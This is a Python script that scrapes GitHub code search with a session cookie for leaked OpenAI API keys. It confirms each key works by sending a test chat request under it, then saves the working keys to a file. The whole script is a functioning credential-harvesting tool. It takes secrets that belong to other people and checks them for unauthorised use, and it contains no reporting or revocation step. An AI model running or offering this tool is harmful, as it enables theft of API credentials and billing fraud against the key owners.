import os
import requests
import re
import openai
import json
from dotenv import load_dotenv

load_dotenv()

regex = r"sk-[a-zA-Z0-9]*T3BlbkFJ[a-zA-Z0-9]*"

cookies = {'user_session': os.getenv('GITHUB_COOKIE_SESSION')}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': 'application/json',
}

valid_keys = []

error_dict = {}

for i in range(1, 6):
    params = {'q': f'/{regex}/', 'type': 'code', 'p': i}
    response = requests.get('https://github.com/search', params=params, cookies=cookies, headers=headers)
    matches = re.findall(regex, response.text)
    
    for match in matches:
        try:
            client = openai.OpenAI(api_key=match)
            client.chat.completions.create(
                messages=[{"role": "user", "content": "Say this is a test"}],
                model="gpt-3.5-turbo"
            )
            valid_keys.append(match)
            print(f"{match}: API key is:\033[92m VALID\033[00m")
        except openai.AuthenticationError:
            error_dict[match] = "API key is:\033[91m NOT VALID\033[00m"
            print(f"{match}: API key is:\033[91m NOT VALID\033[00m")
        except openai.OpenAIError:
            error_dict[match] = "API key:\033[93m VALID but not PAID\033[00m"
            print(f"{match}: API key:\033[93m VALID but not PAID\033[00m")
        except Exception as e:
            error_dict[match] = f"Unknown error: {str(e)}"
            print(f"{match}: Unknown error: {str(e)}")

output_file = os.getenv('OUTPUT_FILE')
if output_file:
    with open(output_file, 'w') as f:
        json.dump(valid_keys, f)
    print(f"Valid keys written to {output_file}")
else:
    print("Error: OUTPUT_FILE environment variable not set.")
